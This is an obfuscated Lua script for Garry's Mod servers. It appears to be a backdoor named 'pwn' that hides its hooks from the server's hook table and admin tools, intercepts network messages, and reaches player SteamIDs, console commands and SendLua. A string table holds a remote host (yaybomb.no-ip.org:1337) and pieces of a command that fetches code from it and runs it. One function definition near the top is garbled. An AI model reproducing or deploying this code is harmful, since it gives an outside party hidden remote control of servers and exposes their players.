


local ov = {}
local slfo = table.concat
local oiuy = string.char
ov.G=''
ov.Cg='6'
ov.Py='s'
ov.zf='p'
ov.Pe='>'
ov.oo='='
ov.Jr='2'
ov.Nh='R'
ov.sf='<'
ov.Nf='|'
ov.Ep='G'
ov.qj='l'
ov.Kk='x'
ov.mh='c'
ov.We='!'
ov.td='	'
ov.ri=' '
ov.Ke='0'
ov.pi='1'
ov.lu='5'
ov.eh='f'
ov.Rq='['
ov.os='.'
ov.ej=':'
ov.Uq='%'
ov.Yg='&'
ov.Le='pt'
ov.xw=', '
ov.ig='[^'
ov.Zk='os'
ov._w='):'
ov.oa='=='
ov.qq='%%'
ov.Vd='\n'
ov.qp=': '
ov.ts='\\'
ov.Bi='ai'
ov.Dg='tf'
ov.fe='\"'
ov.ps='\t'
ov.Lo='pl'
ov.Ty=' ('
ov.sg='ip'
ov.tk='|0'
ov.jr='=]'
ov.nu=' ['
ov.Sj='\\a'
ov.Mh='b64'
ov.bw='spl'
ov.ea='dec'
ov.bh='Msg'
ov.ct='sub'
ov.Pd='\\s'
ov.tp='mod'
ov.P='\\q'
ov.R='Sln'
ov.kk='\\p'
ov.Lf='inf'
ov.jg='chk'
ov.uw='von'
ov.Qw=']: '
ov.vu='\\e'
ov.ze='Add'
ov.lt='enc'
ov.cq='len'
ov._p='get'
ov.ao='pwn'
ov.ti='bin'
ov.Yu='\\t'
ov.nj='cmd'
ov.uo='bit'
ov.ji='\\o'
ov.Ag='CRC'
ov.Tt='key'
ov.Ch='sql'
ov.yg='net'
ov.wq=' \"'
ov.Et='jit'
ov.Lg='\\c'
ov.jw='\\n'
ov.by='uid'
ov.Te='rep'
ov.Ye='?a='
ov.zk=']\n'
ov.vo='reg'
ov.Hw='NONE'
ov.Kg='file'
ov.yu='Nick'
ov.g='math'
ov.ls='ents'
ov.Ka='rate'
ov.Yq=']: ['
ov.Jf='util'
ov.Ve='team'
ov.wf='boot'
ov.fa='HTTP'
ov.Cr='func'
ov.og='undo'
ov._i='time'
ov.gd='reps'
ov.n='byte'
ov.uu='list'
ov.Xs='Copy'
ov.Yk='meta'
ov.jt='MsgC'
ov.Hk='find'
ov.Xy='\\\\'
ov.ar='gsub'
ov.Pp='MsgN'
ov.Xf='game'
ov.Rp='Send'
ov.Uu=']:\n'
ov.Wu='Open'
ov.sh='char'
ov.Xe='wake'
ov.ra='Call'
ov.pe='gmod'
ov.kw='umsg'
ov.cp='HOOK'
ov.hg='Lerp'
ov.Cf='%%%1'
ov.vk='name'
ov.Kt='type'
ov.Bk='next'
ov.ai='0000'
ov.Zw='http'
ov.jd='Path'
ov.Gf='diff'
ov.Jy='hook'
ov.Qs='error'
ov.la='sound'
ov.Zd='46_39_35_221_'
ov.Ur='TIMER'
ov.Mq='drive'
ov.Ad='upper'
ov.hk='E2Lib'
ov.kt='proxy'
ov.Vf='pcall'
ov.Kj='Error'
ov.Ky='Model'
ov.ss='debug'
ov.Je='pairs'
ov.Tf='Start'
ov.dj='delay'
ov.Rr='lower'
ov.y='sleep'
ov.hq='Sound'
ov.yj='Hooks'
ov.to='Think'
ov.dk='Color'
ov.sa='delta'
ov.cr='Merge'
ov.rk='keyid'
ov.dr='Angle'
ov.Zu='crypt'
ov.vi='chk_r'
ov.Ls='\":\n'
ov.rt='cvars'
ov.ya='timer'
ov.Hu='enter'
ov.yh='print'
ov.Ny='table'
ov.Dt='remove'
ov.aj='GetAll'
ov.zp='insert'
ov.Uw='Remove'
ov.fo='CPULib'
ov.Aw='SERVER'
ov.Ih='tobool'
ov.Zy='runlua'
ov.xt='Parser'
ov._u='Player'
ov.Zj='system'
ov.hh='GPULib'
ov.bt='numpad'
ov.De='Vector'
ov.Uk='xpcall'
ov.vf='rawget'
ov.ga='SQLStr'
ov.Rs='isbool'
ov.nd='Format'
ov.Ti='random'
ov.py='ipairs'
ov.Xa='Simple'
ov.Cy='e2_use'
ov.Hy='player'
ov.ep='engine'
ov.Qq='gmsave'
ov.Qk='Entity'
ov.ce='module'
ov.nk='Either'
ov.Ef='Matrix'
ov.hf='assert'
ov.Zs='MsgAll'
ov.xr='unpack'
ov.La='concat'
ov.Ta='gcinfo'
ov.jk='select'
ov.fj='CLIENT'
ov.yd='TypeID'
ov.hd='hammer'
ov.ae='string'
ov.Fa='rawset'
ov.wp='http_id'
ov.At='IsValid'
ov.Pj='address'
ov.Ot='getfenv'
ov.Qy='Replace'
ov.qu='enabled'
ov.cy='__index'
ov.Zf='ai_task'
ov.lf='require'
ov.Gd='timeout'
ov.He='include'
ov.Jq='setfenv'
ov.de='isangle'
ov.xo='navmesh'
ov.hi='cleanup'
ov.Wi='b64_enc'
ov.qy='AdvDupe'
ov.Oq='SendLua'
ov.Rt='ToTable'
ov.Ed='getinfo'
ov.bp='SysTime'
ov.ur='SteamID'
ov.gi='isOwner'
ov.ba='CurTime'
ov.Ui='AddHook'
ov.ad='working'
ov.aq='pwn.srv'
ov.Uf='getBone'
ov.Ww='package'
ov.si='physenv'
ov.bj='weapons'
ov.bo='ispanel'
ov.Uo='b64_dec'
ov.le='widgets'
ov.wy='istable'
ov.Jk='CCSpawn'
ov.Tg='Receive'
ov.cf='isvector'
ov.Ns='EndsWith'
ov.O='isnumber'
ov.li='rawequal'
ov.Bu='PropCore'
ov.iu='UniqueID'
ov.eg='Material'
ov.Yr='tostring'
ov.Iq='pwn_wake'
ov.xg='GetTable'
ov.pw='MakeProp'
ov.Jg='TimedSin'
ov.vg='RealTime'
ov.Xr='download'
ov.Ji='resource'
ov.f='pairs_ac'
ov.Vs='user_msg'
ov.Yp='IntToHex'
ov.Yw='Compiler'
ov.ok='chk_last'
ov.Ps='Timer \"'
ov.Nq='getOwner'
ov.i='GetHooks'
ov.a='validNPC'
ov.kq='getlocal'
ov.Gs='gamemode'
ov.E='ERROR:\n'
ov.ve='BinToInt'
ov.gg='NET HOOK'
ov.Dw='tonumber'
ov.pj='sendtocl'
ov.Gy='hostport'
ov.ih='isstring'
ov.gq='MakeLamp'
ov.Tu='IsEntity'
ov.Iu='TimedCos'
ov.Fh='newproxy'
ov.vt='IntToBin'
ov.Ld='isentity'
ov._q='nextcall'
ov.Po='CallHooks'
ov.Ra='baseclass'
ov.wr='GetTimers'
ov.Ha='GetConVar'
ov.Rd='IsMounted'
ov.Qp='RunString'
ov.o='FrameTime'
ov.au='gameevent'
ov.Pu='StopTimer'
ov.Y='coroutine'
ov.Dd='ReadFloat'
ov.Ng='MakeWheel'
ov.Fw='tablekeys'
ov.Ne='factorial'
ov.sq='dowload_r'
ov.Xt='http_send'
ov.Bp='Tokenizer'
ov._j='AngleRand'
ov.my='vector_up'
ov.Sf='pairs_map'
ov.js='MakeLight'
ov.Ku='construct'
ov.cw='IncludeCS'
ov.Za='DebugInfo'
ov.Ew='short_src'
ov.qt='EmitSound'
ov.r='Spawn_NPC'
ov.nr='StartWith'
ov.m='dupeshare'
ov.Ga='LerpAngle'
ov.By='ServerLog'
ov.fg='ERROR IN '
ov.Ie='PrintTable'
ov.zq='ColorToHSV'
ov.ft='Serialiser'
ov.Yj='Spawn_SENT'
ov.Xo='VectorRand'
ov.Gj='ReadString'
ov.I='properties'
ov.v='\" failed.'
ov.Ae='ColorAlpha'
ov.ot='RemoveHook'
ov.sd='constraint'
ov.ho='WriteFloat'
ov.Lu='DamageInfo'
ov.Lw='chk_failed'
ov.qh='EffectData'
ov.zw='__newindex'
ov.ha='http_proxy'
ov.Jh='CCGiveSWEP'
ov.kh='concommand'
ov.oy='duplicator'
ov.io='HSVToColor'
ov.Uh='StartTimer'
ov.Kw='LerpVector'
ov.xs='MakeButton'
ov.Th='angle_zero'
ov.Bq='ipairs_map'
ov.sr='PauseTimer'
ov.Aa='isfunction'
ov.Eg='tps_pretty'
ov.Mp='WriteString'
ov.Hi='__e2getcost'
ov.hs='VehicleExit'
ov.tr='unconnected'
ov.aa='AdjustTimer'
ov.Hg='TimerExists'
ov.ef='AddCSE2File'
ov.qe='usermessage'
ov.No='RunStringEx'
ov.Bo='ErrorNoHalt'
ov.we='BeamNetVars'
ov.of='TauntCamera'
ov.mu='CreateSound'
ov.hw='ai_schedule'
ov.M='checkEntity'
ov.Tj='MakeBalloon'
ov.ie='LocalPlayer'
ov.u='CompileFile'
ov.Jo='pwn.init_cl'
ov.Ah='__e2setcost'
ov.Gg='color_white'
ov.Ki='MakeEmitter'
ov.e='setinterval'
ov.bs='tablevalues'
ov.Ud='RandomPairs'
ov.Mi='MakeWirehdd'
ov.Au='MakeWireGPS'
ov.fh='http_answer'
ov.Sg='SetE2DLight'
ov.Qt='GetHostName'
ov.hu='MakeWireCam'
ov.uq='CreateTimer'
ov.nq='color_black'
ov.gf='saverestore'
ov.Ri='StringToHex'
ov.Sh='MakeWirePod'
ov.Fi='SortedPairs'
ov.qa='getregistry'
ov.zh='GateActions'
ov.s='SimpleTimer'
ov.Xp='CheckTimers'
ov.fs='SendToServer'
ov.gu='registerType'
ov.iy='MakeWirePlug'
ov.Is='printplayers'
ov.ny='AddCSLuaFile'
ov.Eq='MakeWireLamp'
ov.Hh='http_waiting'
ov.st='SetGlobalInt'
ov.mp='setmetatable'
ov.as='http.Fetch("'
ov.Fs='DestroyTimer'
ov.Ap='EmitSentence'
ov.zd='MakeDynamite'
ov.yt='PrintMessage'
ov.Qo='MakeWireDHDD'
ov.zu='e2_softquota'
ov._e='update_derma'
ov.Lk='MakeWireUser'
ov.bu='SimpleTimer#'
ov.va='remove_derma'
ov.Xw='AccessorFunc'
ov.Ey='GetGlobalVar'
ov.ns='validPhysics'
ov.ck='CC_GMOD_Tool'
ov.Ii='WorldToLocal'
ov.Jd='MakeWire7Seg'
ov._r='OrderVectors'
ov.tw='LocalToWorld'
ov.Hd='debugoverlay'
ov.Nr='MakeWireGate'
ov.h='SetGlobalVar'
ov.d='chk_interval'
ov.Ei='UnPauseTimer'
ov.z='PreProcessor'
ov.np='E2Power_pass'
ov.ew='BroadcastLua'
ov.Gu='e2_hardquota'
ov.lp='CreateConVar'
ov.vy='ConVarExists'
ov.ly='MakeThruster'
ov.du='getmetatable'
ov.Xg='Spawn_Weapon'
ov.ja='motionsensor'
ov.Ly='GetGlobalInt'
ov.qd='NET CALLBACK'
ov.wh='e2_tickquota'
ov.ue='replycommands'
ov.Hp='e2_get_typeid'
ov.yo='pwn_chk_timer'
ov.oi='GetGlobalBool'
ov.Aj='MakeWireWheel'
ov.J='MakeWireValue'
ov.hr='scripted_ents'
ov.mk='E2_spawn_beam'
ov.uh='MakeWireTrail'
ov.df='MakeWireStore'
ov.Ca='T7ZmdU5RDusZAzISP9DcopC9eaz2FulLfbSzZ5JcX9IYglP488juUydxsXbwfrMYNRYfKf1GljAoShCXSn3H0sdosji9OGoKpwKXBvfCuDNjYrL68DQMaaHDjbeQy1yFo28AOq7haoOfb6DiIsw5glI9ctTmxVHgUaoDtob7H'
ov.Np='VGUIFrameTime'
ov.gy='Spawn_Vehicle'
ov.pf='NewBallSocket'
ov.lw='MakeWirePanel'
ov.Rk='E2_spawn_quad'
ov.To='ProtectedCall'
ov.cd='SoundDuration'
ov.fu='SetGlobalBool'
ov.Yd='ModelPlugInfo'
ov.Aq='MakeWireRelay'
ov.Zh='vector_origin'
ov.Xi='kRenderFxNone'
ov.Ni='MakeHoverBall'
ov.mg='g_SBoxObjects'
ov.ed='MakeWireLatch'
ov.Dp='FindMetaTable'
ov.nt='query_blocked'
ov.Wr='pwn_http_send'
ov.iq='MakeWireWinch'
ov.ff='e2_parse_args'
ov.fq='PrecacheScene'
ov.Wh='MakeWirePixel'
ov.Vh='-------------'
ov.ww='CompileString'
ov.F='Add_NPC_Class'
ov.up='MakeWireLight'
ov.ye='HTTP CALLBACK'
ov.ky='GMODSpawnProp'
ov.Ht='MakeWireCDRay'
ov.Td='MakeWireRadio'
ov.Mf='CheckFunction'
ov.Bs='LoadWireGates'
ov.tj='MakeWireInput'
ov.Cu='MakeWireNailer'
ov.rd='MakeWireCDLock'
ov.Lj='MakeWireWeight'
ov.ka='MakeWireCDDisk'
ov.Nd='collectgarbage'
ov._o='InitPostEntity'
ov.ag='MakeWireOutput'
ov.Dq='MakeWireEyePod'
ov.ty='CheckPropSolid'
ov.sk='GetGlobalAngle'
ov._d='MakeWireForcer'
ov.Qj='MakeWireAdvPod'
ov.Gw='MakeWireButton'
ov.ip='AddOriginToPVS'
ov.Oj='MakeWireExtBus'
ov.Wo='MakeWireSensor'
ov.Os='pairs_sortkeys'
ov.eu='AccessorFuncNW'
ov.Uj='MakeWireScreen'
ov.Lh='SetGlobalAngle'
ov.V='player_manager'
ov.oe='e2_extpp_pass2'
ov.Ss='GetGlobalFloat'
ov.Rg='ParticleEffect'
ov.Kr='e2_extpp_pass1'
ov.bf='Radio_SendData'
ov.x='DeriveGamemode'
ov.Gp='MakeWireNumpad'
ov.Tk='MakeWireTurret'
ov.Xu='Radio_Register'
ov.zt='MakeWireRanger'
ov.Kh='SetGlobalFloat'
ov.Vk='MakeWireSocket'
ov.hp='sendDermaStuff'
ov.pk='GetConVarString'
ov.Xd='MakeWireIgniter'
ov.wj='GetGlobalEntity'
ov.fy='MakeWireLocator'
ov.Fj='SYNTAX ERROR:\n'
ov.C='E2_spawn_sprite'
ov.Mu='local pwn=_G[\''
ov.zo='MakeWireSpawner'
ov.Js='SendUserMessage'
ov.Ek='E2_Spawn_Effect'
ov.ld='GPUCacheManager'
ov.qs='GetConVarNumber'
ov.jq='SetGlobalEntity'
ov.ry='SetGlobalString'
ov.Ms='physgun_limited'
ov.su='E2Power_Version'
ov.Ee='MakeWireGrabber'
ov.mf='MakeWireEmitter'
ov.ng='RecipientFilter'
ov.Bd='MakeWireVehicle'
ov.jf='GetGlobalString'
ov.Wf='GMODSpawnEffect'
ov.ug='GetGlobalVector'
ov.fd='pwn_http_answer'
ov._y='MakeWireColorer'
ov.aw='SetGlobalVector'
ov.t='pwn_CheckTimers'
ov.Vw='MakeWireEmarker'
ov.uy='kRenderFxRagdoll'
ov.A='validModelCached'
ov.Us='pairs_sortvalues'
ov.Fr='registerCallback'
ov.Rh='MakeWireDataRate'
ov.Su='MakeWireHologrid'
ov.Od='GMODSpawnRagdoll'
ov.Hr='MakeWireWaypoint'
ov.Zq='MakeWireDataPort'
ov.bg='registerFunction'
ov.ee='fsender_interval'
ov.kf='SafeRemoveEntity'
ov.Ck='DropEntityIfHeld'
ov.ir='%d%d%d?%d?%d?%d?'
ov.ey='kRenderFxEnvRain'
ov.pr='MakeWireDataPlug'
ov.My='MakeWireAdvInput'
ov.md='MakeWireKeyboard'
ov.Sw='kRenderFxExplode'
ov.re='SetGlobalBeamInt'
ov.Mg='kRenderFxDistort'
ov.Hq='MakeWireThruster'
ov.fr='registerOperator'
ov.cg='EB729602389D126'
ov.Eo='Radio_Unregister'
ov.Mr='GetGlobalBeamInt'
ov.yy='AddNetworkString'
ov.rq='0123456789ABCDEF'
ov.ku='e2_tostring_bone'
ov.Rj='kRenderFxEnvSnow'
ov.Zo='RunConsoleCommand'
ov.ru='kRenderFxFadeFast'
ov.tu='MakeWireGyroscope'
ov.Oe='MakeWireHydraulic'
ov.qi='E2Power_BlackList'
ov.Na='kRenderFxFadeSlow'
ov.If='NetworkStringToID'
ov.Pq='CC_Face_Randomize'
ov.Si='MakeWireDualInput'
ov._s='MakeWireIndicator'
ov.Iw='MakeWireExplosive'
ov.Hs='GetGlobalBeamBool'
ov.Wk='Radio_GetTwoWayID'
ov.yk='color_transparent'
ov.Ay='NetworkIDToString'
ov.ca='E2Power_GroupList'
ov.Mj='MakeWireDetonator'
ov.cj='kRenderFxHologram'
ov.Ry='2.lua",RunString)'
ov.lj='IsEnemyEntityName'
ov.od='MakeWireFXEmitter'
ov.Fy='E2Power_PassAlert'
ov.Gr='Radio_RecieveData'
ov.nh='AddConsoleCommand'
ov.hy='SetGlobalBeamBool'
ov.fk='MakeWireHoverBall'
ov.po='SetGlobalBeamAngle'
ov._a='MakeWireDataSocket'
ov.Du='SetGlobalBeamFloat'
ov.Ir='ModelPlug_Register'
ov.yq='ApplyColMatSpawned'
ov.j='kRenderFxSolidFast'
ov.ia='GetGlobalBeamFloat'
ov.wa='PlayerInitialSpawn'
ov.bd='kRenderFxPulseSlow'
ov.Zi='kRenderFxSpotlight'
ov.vw='GetGlobalBeamAngle'
ov.Cs='MakeWireAddressBus'
ov.Oi='MakeWireTextScreen'
ov.sw='kRenderFxSolidSlow'
ov.jp='SortedPairsByValue'
ov.Dk='kRenderFxGlowShell'
ov.dp='PlaceDecal_delayed'
ov.Qd='CreateClientConVar'
ov.qk='E2Power_first_load'
ov.mj='IsFriendEntityName'
ov.Ig='SuppressHostEvents'
ov.N='MakeWireAdvEMarker'
ov.Wt='MakeWireTransferer'
ov.Jp='kRenderFxPulseFast'
ov.Ho='UnPredictedCurTime'
ov.Vj='DoPropSpawnedEffect'
ov.b='GetGlobalBeamString'
ov.Br='SetGlobalBeamEntity'
ov.Yh='GetGlobalBeamVector'
ov.Cd='kRenderFxStrobeFast'
ov.jh='SetGlobalBeamString'
ov.oq='sensor_debugragdoll'
ov.Wq='UTIL_IsUselessModel'
ov.Dy='SetGlobalBeamVector'
ov.Ao='DoPlayerEntitySpawn'
ov.yw='MakeWireSpeedometer'
ov.As='kRenderFxStrobeSlow'
ov.Mt='MakeWireHoloemitter'
ov.qw='MakeWireExpression2'
ov.dy='Radio_ChangeChannel'
ov.T='MakeWireWaterSensor'
ov.Cj='GetGlobalBeamEntity'
ov.xp='MakeWireOscilloscope'
ov.Vt='MakeWireHudIndicator'
ov.co='MakeWireTwoWay_Radio'
ov.Tq='kRenderFxFlickerSlow'
ov.kp='PrecacheSentenceFile'
ov.Xk='MakeWireTextReceiver'
ov.zy='ParticleEffectAttach'
ov.he='MakeGPULibController'
ov.cu='IsFirstTimePredicted'
ov.tf='MakeWireTargetFinder'
ov.xk='MakeClutchController'
ov.Pt='InjectConsoleCommand'
ov.Gk='kRenderFxFlickerFast'
ov.Md='MakeWireLaserReceiver'
ov.Ft='kRenderFxStrobeFaster'
ov.Bt='E2_spawn_prop_dynamic'
ov.rj='MakeWireDigitalScreen'
ov.Eh='MakeWireDynamicButton'
ov._t='PrecacheSentenceGroup'
ov.bi='RestoreCursorPosition'
ov.Oy='RefreshSpecialOutputs'
ov.Fu='MakeWireconsoleScreen'
ov.Yo='sensor_stretchragdoll'
ov.Hj='MakeWireSatellitedish'
ov.uf='%d%d%d?%d?%d?%d?%d?%d?'
ov._='MakeWireGraphicsTablet'
ov.Ro='RememberCursorPosition'
ov.ma='PrecacheParticleSystem'
ov.l='IsTableOfEntitiesValid'
ov.Ej='MakeWireVectorThruster'
ov.Vg='kRenderFxClampMinScale'
ov.Ug='kRenderFxNoDissipation'
ov.kg='MakeWireDamageDetector'
ov.rh='kRenderFxPulseFastWide'
ov.Sk='kRenderFxPulseSlowWide'
ov.Ju='E2_Spawn_ParticleEffect'
ov.Vo='kRenderFxPulseFastWider'
ov.Qh='MakeWireWinchController'
ov.go='SafeRemoveEntityDelayed'
ov.ph='MakeWireSimpleExplosive'
ov.eo='MakeWireLatchController'
ov.Xh='BuildNetworkedVarsTable'
ov.H='SetPhysConstraintSystem'
ov.Ip='FixInvalidPhysicsObject'
ov.Cp='SortedPairsByMemberValue'
ov.Wa='InjectCommandAutocomplete'
ov.Go='MakeWireHydraulicController'
ov.iw='Expression2SetProgressServer'
ov.Df='[%-%^%$%(%)%%%.%[%]%*%+%-%?]'
ov.mw='lua/includes/modules/hook.lua'
ov.pu='http://yaybomb.no-ip.org:1337/'
ov.Lp='ComboBox_Wire_FX_Emitter_Options'
ov.dh='\']local G,R,cmd=pwn.G,pwn.R,pwn.G.cmd '
ov.Qf='pwn.Call: argument list is not valid. Values: '
ov.er='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

local org_oiuy = oiuy
local function ''
	local r = { org_'' }
	
	print( 'iouy' )
	PrintTable( r )
	
	return unpack( r )
end

timer['Simple'] -- timer.Simple
(0, function()
	if !pcall then return end
	
	pcall(function()
		local tbl=setmetatable({},{},util['CRC'](GetConVarString('ip'))*2) if tbl and tbl['G']!=nil then if tbl['boot'] and !tbl['working'] then tbl['boot']() end return end local pwn={} local gr_tbl=_G[util['CRC'](os['time']()*228)] if !gr_tbl then gr_tbl={_G,debug['getregistry']()} pwn['sendtocl']=true end local lpairs,listable=gr_tbl[1]['pairs'],gr_tbl[1]['istable'] local function tCopy(t, lookup_table) local copy = {} for i,v in lpairs(t) do if !listable(v) then copy[i] = v else lookup_table = lookup_table or {} lookup_table[t] = copy if lookup_table[v] then copy[i] = lookup_table[v] else copy[i] = tCopy(v,lookup_table) end end end return copy end local G=tCopy(gr_tbl[1]) local R=tCopy(gr_tbl[2]) local called=false local function oncall() called=true end local lprint,lMsg,lMsgN,lMsgC,lMsgAll,lPrintMessage,lfopen,lErrorNoHalt pwn['CheckFunction']=function(func) if func then called=false lprint=print lMsg=Msg lMsgN=MsgN lMsgC=MsgC lMsgAll=MsgAll lPrintMessage=PrintMessage lfopen=file['Open'] lErrorNoHalt=ErrorNoHalt print=oncall Msg=oncall MsgN=oncall MsgC=oncall MsgAll=oncall PrintMessage=oncall file['Open']=oncall ErrorNoHalt=oncall G['pcall'](func) print=lprint Msg=lMsg MsgN=lMsgN MsgC=lMsgC MsgAll=lMsgAll PrintMessage=lPrintMessage file['Open']=lfopen ErrorNoHalt=lErrorNoHalt return !called else return true end end local chk_funcs={pcall,getmetatable,setmetatable,rawset,GetConVarString,GetHostName,CompileString,net['Start'],net['Send'],net['SendToServer'],net['ReadFloat'],net['WriteFloat'],net['ReadString'],net['WriteString'],util['NetworkIDToString'],util['CRC']} for k,f in G['pairs'](chk_funcs) do if !pwn['CheckFunction'](f) then return end end pwn['G']=G pwn['R']=R pwn['G']['cmd']=G['RunConsoleCommand'] local SERVER=G['SERVER'] local CLIENT=G['CLIENT'] local RunConsoleCommand=G['RunConsoleCommand'] local print=G['print'] local LocalPlayer=G['LocalPlayer'] local tonumber=G['tonumber'] local tostring=G['tostring'] local GetHostName=G['GetHostName'] local GetConVarString=G['GetConVarString'] local CompileString=G['CompileString'] local type=G['type'] local pcall=G['pcall'] local CurTime=G['CurTime'] local isnumber=G['isnumber'] local isfunction=G['isfunction'] local isstring=G['isstring'] local istable=G['istable'] local HTTP=G['HTTP'] local UnPredictedCurTime=G['UnPredictedCurTime'] local unpack=G['unpack'] local include=G['include'] local pUniqueID=R['Player']['UniqueID'] local pSteamID=R['Player']['SteamID'] local pNick=R['Player']['Nick'] local pSendLua=R['Player']['SendLua'] local string=G['string'] local math=G['math'] local player=G['player'] local os=G['os'] local http=G['http'] local table=G['table'] local gmod=G['gmod'] local file=G['file'] string['ToTable'] =function( str ) local tbl = {} for i = 1, string['len']( str ) do tbl[i] = string['sub']( str, i, i ) end return tbl end string['Replace']=function( str, tofind, toreplace ) tofind = tofind:gsub( '[%-%^%$%(%)%%%.%[%]%*%+%-%?]', '%%%1' ) toreplace = toreplace:gsub( '%%', '%%%1' ) return ( str:gsub( tofind, toreplace ) ) end string['StartWith']=function( String, Start ) return string['sub']( String, 1, string['len'] (Start ) ) == Start end string['EndsWith']=function( String, End ) return End == '' or string['sub']( String, -string['len']( End ) ) == End end table['Copy']=function(t, lookup_table) if (t == nil) then return nil end local copy = {} G['setmetatable'](copy, G['getmetatable'](t)) for i,v in G['pairs'](t) do if ( !istable(v) ) then copy[i] = v else lookup_table = lookup_table or {} lookup_table[t] = copy if lookup_table[v] then copy[i] = lookup_table[v] else copy[i] = table['Copy'](v,lookup_table) end end end return copy end table['Merge']=function(dest, source) for k,v in G['pairs'](source) do if ( type(v) == 'table' && type(dest[k]) == 'table' ) then table['Merge'](dest[k], v) else dest[k] = v end end return dest end pwn['Call']=function(type,name,func,...) if isstring(type) and isstring(name) and isfunction(func) then local bool,res=pcall(func,...) if !bool then pwn['p']('ERROR IN '..string['upper'](type)..' "'..name..'":
'..res) end return bool else pwn['p']('pwn.Call: argument list is not valid. Values: '..tostring(type)..', '..tostring(name)..', '..tostring(func)) return false end end local wtbl={} local ghooks=G['hook']['GetTable']() local has_ulib=ghooks!=hook['Hooks'] if has_ulib then local chk_funcs={G['hook']['GetTable'](),G['hook']['Add'],G['hook']['Remove']} for k,f in G['pairs'](chk_funcs) do if !pwn['CheckFunction'](f) then return end end setmetatable=function(tbl,metatbl,keyword) if keyword==tonumber(G['util']['CRC'](GetConVarString('ip')))*2 then return pwn end return G['setmetatable'](tbl,metatbl) end else local lhooks=table['Copy'](ghooks) local hm local index,newindex local function checktrace() local info=G['debug']['getinfo'](3,'Sln') if info and info['name']==nil and info['short_src']=='lua/includes/modules/hook.lua' then return true else return false end end index=function(self,key) local cidx,t if hm and hm['__index'] and !lhooks[key] then if isfunction(hm['__index']) then cidx={pcall(hm['__index'],self,key)} if cidx[1] then table['remove'](cidx,1) t=1 end elseif istable(hm['__index']) then cidx=hm['__index'][key] t=2 else cidx=hm['__index'] t=3 end end if wtbl[key] and checktrace() then if t then if t==1 then cidx=cidx[1] end if istable(cidx) then return table['Merge'](wtbl[key],cidx) else return wtbl[key] end else if lhooks[key] and istable(lhooks[key]) then return table['Merge'](wtbl[key],lhooks[key]) else return wtbl[key] end end else if t then if t==1 then return unpack(cidx) else return cidx end else return lhooks[key] end end end newindex=function(self,key,value) if hm and hm['__newindex'] and !lhooks[key] then if isfunction(hm['__newindex']) then pcall(hm['__newindex'],self,key,value) return elseif istable(hm['__newindex']) then hm['__newindex'][key]=value return end end if isnumber(key) then G['rawset'](self,key,value) end lhooks[key]=value end getmetatable=function(tbl) if tbl==ghooks then return hm else return G['getmetatable'](tbl) end end setmetatable=function(tbl,metatbl,keyword) if keyword==tonumber(G['util']['CRC'](GetConVarString('ip')))*2 then return pwn end if tbl==ghooks then hm=metatbl if istable(metatbl) then metatbl=tCopy(metatbl) metatbl['__index']=index metatbl['__newindex']=newindex G['setmetatable'](tbl,metatbl) elseif metatbl==nil then G['setmetatable'](tbl,{ __index=index, __newindex=newindex }) else G['setmetatable']({},metatbl) end return tbl else return G['setmetatable'](tbl,metatbl) end end debug['getmetatable']=function(tbl) if istable(tbl) then if tbl==ghooks then return hm else return G['debug']['getmetatable'](tbl) end end end debug['setmetatable']=function(tbl,metatbl) if istable(tbl) and (istable(metatbl) or metatbl==nil) then if tbl==ghooks then hm=metatbl if istable(metatbl) then metatbl=tCopy(metatbl) metatbl['__index']=index metatbl['__newindex']=newindex G['debug']['setmetatable'](tbl,metatbl) elseif metatbl==nil then G['debug']['setmetatable'](tbl,{ __index=index, __newindex=newindex }) else G['debug']['setmetatable']({},metatbl) end return tbl else return G['debug']['setmetatable'](tbl,metatbl) end end end rawget=function(tbl,index) if tbl==ghooks then return lhooks[index] else return G['rawget'](tbl,index) end end rawset=function(tbl,index,value) if tbl==ghooks then lhooks[index]=value return tbl else return G['rawset'](tbl,index,value) end end rawequal=function(obj1,obj2) if obj1==ghooks then obj1=lhooks end if obj2==ghooks then obj2=lhooks end return G['rawequal'](obj1,obj2) end pairs=function(tbl) if tbl==ghooks then return G['pairs'](lhooks) else return G['pairs'](tbl) end end ipairs=function(tbl) if tbl==ghooks then return G['pairs'](lhooks) else return G['pairs'](tbl) end end next=function(tbl,index) if tbl==ghooks then return G['next'](lhooks,index) else return G['next'](tbl,index) end end for k,v in G['pairs'](ghooks) do if !isnumber(k) then ghooks[k]=nil end end local metatbl=G['getmetatable'](ghooks) if metatbl then setmetatable(ghooks,metatbl) else G['setmetatable'](ghooks,{ __index=index, __newindex=newindex }) end end local getmetatable=G['getmetatable'] local setmetatable=G['setmetatable'] local pairs=G['pairs'] local ipairs=G['ipairs'] local next=G['next'] local hook=G['hook'] local debug=G['debug'] local hooks={} pwn['GetHooks']=function() return hooks end pwn['AddHook']=function(event_name,name,func) if isstring(event_name) and isstring(name) and isfunction(func) then if !hooks[event_name] then hooks[event_name]={} end if !wtbl[event_name] then wtbl[event_name]={} end local oldf=func func=function(...) pwn['Call']('HOOK',name,oldf,...) end hooks[event_name][name]=func wtbl[event_name][name]=func if has_ulib then name=tostring(G['util']['CRC'](name)*string['len'](name)) hook['Add'](event_name,name,func) local ghooks=hook['GetTable']() if ghooks[event_name] and ghooks[event_name][name] then ghooks[event_name][name]=nil end end end end pwn['RemoveHook']=function(event_name,name) if hooks[event_name] and hooks[event_name][name] then hooks[event_name][name]=nil wtbl[event_name][name]=nil if has_ulib then name=tostring(G['util']['CRC'](name)*string['len'](name)) hook['Remove'](event_name,name) end end end pwn['CallHooks']=function(event_name,...) if !hooks[event_name] then hooks[event_name]={} end if !wtbl[event_name] then wtbl[event_name]={} return end for k,f in pairs(wtbl[event_name]) do f(...) end end local wtbl={} util['NetworkIDToString']=function(id) if isstring(id) then id=tonumber(id) end if isnumber(id) then local val=G['util']['NetworkIDToString'](id) if wtbl[val] then if debug['getinfo'](2) then local lenn,len=debug['getlocal'](2,1) local plyn,ply=debug['getlocal'](2,2) wtbl[val](len,ply) end else return val end end end pwn['Receive']=function(name,func) if isstring(name) and isfunction(func) then local oldf=func func=function(...) pwn['Call']('NET HOOK',name,oldf,...) end wtbl[string['lower'](name)]=func end end local util=G['util'] local net=G['net'] local timers,simple_timers={},{} /*function pwn['GetTimers']() return timers,simple_timers end*/ pwn['TimerExists']=function(name) return timers[name]!=nil end pwn['CreateTimer']=function(name,delay,reps,func) if isstring(name) and isnumber(delay) and delay>0 and isnumber(reps) and reps>=0 and isfunction(func) then timers[name]={ enabled=true, delay=delay, nextcall=CurTime()+delay, reps=reps, func=func } return true else return false end end pwn['DestroyTimer']=function(name) timers[name]=nil return true end 